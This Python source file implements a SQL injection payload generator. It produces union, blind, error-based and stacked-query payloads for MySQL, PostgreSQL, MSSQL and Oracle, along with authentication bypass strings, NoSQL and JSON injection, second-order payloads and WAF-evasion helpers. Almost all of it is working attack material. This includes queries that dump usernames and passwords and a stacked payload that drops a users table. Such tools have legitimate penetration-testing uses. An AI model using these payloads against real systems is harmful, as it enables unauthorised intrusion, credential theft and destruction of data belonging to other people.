"""SQL Injection Payload Generator."""

import urllib.parse
from pathlib import Path
from typing import List, Union, Optional


class SQLiGenerator:
    """Generate SQL injection payloads for various databases."""

    def __init__(self):
        """Initialize generator."""
        self.templates_dir = Path(__file__).parent / "templates"

    def generate(
        self,
        target_db: str,
        payload_type: str,
        include_metadata: bool = False
    ) -> List[Union[str, dict]]:
        """Generate SQL injection payloads.

        Args:
            target_db: Database type (mysql, postgresql, mssql, oracle, generic)
            payload_type: Payload type (union, blind, error, stacked, auth_bypass)
            include_metadata: Return dict with metadata instead of plain strings

        Returns:
            List of payloads
        """
        target_db = target_db.lower()
        payload_type = payload_type.lower()

        # Route to appropriate generator
        if target_db == "mysql":
            if payload_type == "union":
                payloads = self.generate_mysql_union()
            elif payload_type == "blind":
                payloads = self.generate_mysql_blind()
            elif payload_type == "error":
                payloads = self.generate_mysql_error()
            else:
                payloads = self.generate_mysql_union()
        elif target_db == "postgresql":
            if payload_type == "union":
                payloads = self.generate_postgresql_union()
            elif payload_type == "stacked":
                payloads = self.generate_postgresql_stacked()
            else:
                payloads = self.generate_postgresql_union()
        elif target_db == "mssql":
            if payload_type == "union":
                payloads = self.generate_mssql_union()
            elif payload_type == "blind":
                payloads = self.generate_mssql_blind()
            else:
                payloads = self.generate_mssql_union()
        elif target_db == "oracle":
            payloads = self.generate_oracle_union()
        else:
            # Generic/unknown database
            payloads = self.generate_auth_bypass()

        if include_metadata:
            return [
                {
                    "payload": p,
                    "type": payload_type,
                    "database": target_db,
                    "description": f"{target_db} {payload_type} injection"
                }
                for p in payloads
            ]

        return payloads

    # MySQL Payloads

    def generate_mysql_union(self, columns: int = 3) -> List[str]:
        """Generate MySQL UNION-based injection payloads."""
        payloads = []

        # Basic UNION SELECT
        for col_count in range(1, columns + 1):
            nulls = ",".join(["NULL"] * col_count)
            payloads.append(f"' UNION SELECT {nulls}--")
            payloads.append(f"' UNION SELECT {nulls}#")
            payloads.append(f"' UNION ALL SELECT {nulls}--")

        # Information schema enumeration
        payloads.extend([
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
            "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
            "' UNION SELECT username,password FROM users--",
            "' UNION SELECT GROUP_CONCAT(username),GROUP_CONCAT(password) FROM users--",
        ])

        return payloads

    def generate_mysql_blind(
        self,
        blind_type: str = "time"
    ) -> List[str]:
        """Generate MySQL blind injection payloads."""
        payloads = []

        if blind_type == "time":
            # Time-based blind
            payloads.extend([
                "' AND SLEEP(5)--",
                "' OR SLEEP(5)--",
                "' AND IF(1=1,SLEEP(5),0)--",
                "' AND IF(SUBSTRING(user(),1,1)='r',SLEEP(5),0)--",
                "' AND BENCHMARK(5000000,MD5('a'))--",
            ])
        else:
            # Boolean-based blind
            payloads.extend([
                "' AND 1=1--",
                "' AND 1=2--",
                "' OR 1=1--",
                "' AND SUBSTRING(user(),1,1)='r'--",
                "' AND LENGTH(database())>5--",
                "' AND ASCII(SUBSTRING(user(),1,1))>100--",
            ])

        return payloads

    def generate_mysql_error(self) -> List[str]:
        """Generate MySQL error-based injection payloads."""
        return [
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--",
            "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--",
            "' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--",
        ]

    # PostgreSQL Payloads

    def generate_postgresql_union(self, columns: int = 3) -> List[str]:
        """Generate PostgreSQL UNION-based injection payloads."""
        payloads = []

        for col_count in range(1, columns + 1):
            nulls = ",".join(["NULL"] * col_count)
            payloads.append(f"' UNION SELECT {nulls}--")

            # Type casting (PostgreSQL specific)
            typed_nulls = ",".join([f"NULL::text"] * col_count)
            payloads.append(f"' UNION SELECT {typed_nulls}--")

        # PostgreSQL-specific queries
        payloads.extend([
            "' UNION SELECT current_user,version()--",
            "' UNION SELECT current_database(),current_schema()--",
            "' UNION SELECT datname,NULL FROM pg_database--",
            "' UNION SELECT tablename,NULL FROM pg_tables WHERE schemaname='public'--",
        ])

        return payloads

    def generate_postgresql_stacked(self) -> List[str]:
        """Generate PostgreSQL stacked query payloads."""
        return [
            "'; SELECT pg_sleep(5)--",
            "'; DROP TABLE users--",
            "'; CREATE TABLE hacked (id int)--",
            "'; INSERT INTO users VALUES ('hacked')--",
        ]

    # MSSQL Payloads

    def generate_mssql_union(self, columns: int = 3) -> List[str]:
        """Generate MSSQL UNION-based injection payloads."""
        payloads = []

        for col_count in range(1, columns + 1):
            nulls = ",".join(["NULL"] * col_count)
            payloads.append(f"' UNION SELECT {nulls}--")

        # MSSQL-specific
        payloads.extend([
            "' UNION SELECT @@version,NULL--",
            "' UNION SELECT DB_NAME(),USER_NAME()--",
            "' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--",
        ])

        return payloads

    def generate_mssql_blind(self) -> List[str]:
        """Generate MSSQL blind injection payloads."""
        return [
            "'; WAITFOR DELAY '00:00:05'--",
            "'; IF (1=1) WAITFOR DELAY '00:00:05'--",
            "'; IF (SUBSTRING(@@version,1,1)='M') WAITFOR DELAY '00:00:05'--",
        ]

    # Oracle Payloads

    def generate_oracle_union(self, columns: int = 3) -> List[str]:
        """Generate Oracle UNION-based injection payloads."""
        payloads = []

        for col_count in range(1, columns + 1):
            nulls = ",".join(["NULL"] * col_count)
            # Oracle requires FROM dual
            payloads.append(f"' UNION SELECT {nulls} FROM dual--")

        # Oracle-specific
        payloads.extend([
            "' UNION SELECT banner,NULL FROM v$version--",
            "' UNION SELECT user,NULL FROM dual--",
            "' UNION SELECT table_name,NULL FROM all_tables--",
        ])

        return payloads

    # Generic/Auth Bypass

    def generate_auth_bypass(self) -> List[str]:
        """Generate authentication bypass payloads."""
        return [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "admin' OR '1'='1'--",
            "admin' OR '1'='1'#",
            "admin'--",
            "admin'#",
            "' OR 1=1--",
            "' OR 1=1#",
            "') OR ('1'='1",
            "') OR ('1'='1'--",
            "' OR 'x'='x",
            "admin' --",
            "' UNION SELECT NULL,NULL WHERE 1=1--",
        ]

    def generate_column_enumeration(self, max_columns: int = 10) -> List[str]:
        """Generate column enumeration payloads."""
        payloads = []

        for i in range(1, max_columns + 1):
            payloads.append(f"' ORDER BY {i}--")

        return payloads

    def generate_table_enumeration(self, db_type: str = "mysql") -> List[str]:
        """Generate table enumeration payloads."""
        if db_type.lower() == "mysql":
            return [
                "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                "' UNION SELECT table_name,table_schema FROM information_schema.tables--",
            ]
        elif db_type.lower() == "postgresql":
            return [
                "' UNION SELECT tablename,NULL FROM pg_tables--",
            ]
        else:
            return []

    # WAF Evasion

    def obfuscate_with_comments(self, payload: str) -> str:
        """Add comment-based obfuscation."""
        # Add inline comments
        payload = payload.replace("UNION", "/**/UNION/**/")
        payload = payload.replace("SELECT", "/**/SELECT/**/")
        payload = payload.replace("FROM", "/**/FROM/**/")
        return payload

    def generate_case_variants(self, payload: str) -> List[str]:
        """Generate case variation evasion."""
        variants = [
            payload,
            payload.upper(),
            payload.lower(),
        ]

        # Mixed case
        mixed = ""
        for i, char in enumerate(payload):
            mixed += char.upper() if i % 2 == 0 else char.lower()
        variants.append(mixed)

        return list(set(variants))

    # Encoding

    def encode_payload(self, payload: str, encoding: str) -> str:
        """Encode payload."""
        if encoding == "url":
            return urllib.parse.quote(payload)
        elif encoding == "hex":
            # MySQL hex encoding
            hex_str = "".join(f"{ord(c):02x}" for c in payload)
            return f"0x{hex_str}"
        else:
            return payload

    # NoSQL Injection

    def generate_nosql_injection(self, db_type: str = "mongodb") -> List[str]:
        """Generate NoSQL injection payloads."""
        if db_type.lower() == "mongodb":
            return [
                "' || 1==1//",
                "' || 1==1%00",
                '{"$gt":""}',
                '{"$ne":null}',
                '{"$regex":".*"}',
                "admin' || 'a'=='a",
            ]
        else:
            return []

    # Context-Aware Generation

    def generate_for_context(self, context: str) -> List[str]:
        """Generate payloads for specific context."""
        if context == "numeric":
            # Numeric context (no quotes needed)
            return [
                "1 OR 1=1--",
                "1 UNION SELECT NULL--",
                "1 AND SLEEP(5)--",
            ]
        elif context == "string":
            # String context (quotes needed)
            return self.generate_auth_bypass()
        else:
            return self.generate_auth_bypass()

    # JSON Injection

    def generate_json_injection(self) -> List[str]:
        """Generate JSON-based SQL injection."""
        return [
            '{"username": "admin", "password": {"$ne": null}}',
            '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
            '{"username": "admin\' OR \'1\'=\'1", "password": "x"}',
        ]

    # Second-Order Injection

    def generate_second_order(self) -> List[str]:
        """Generate second-order injection payloads."""
        return [
            "admin'+(SELECT version())+'",
            "admin'||(SELECT version())||'",
            "admin'+(SELECT * FROM users WHERE id=1)+'",
        ]

    # Utility

    def detect_db_from_error(self, error_message: str) -> str:
        """Detect database type from error message."""
        error_lower = error_message.lower()

        if "mysql" in error_lower or "you have an error in your sql syntax" in error_lower:
            return "mysql"
        elif "postgresql" in error_lower or "syntax error at or near" in error_lower:
            return "postgresql"
        elif "microsoft sql" in error_lower or "mssql" in error_lower:
            return "mssql"
        elif "oracle" in error_lower or "ora-" in error_lower:
            return "oracle"
        else:
            return "unknown"
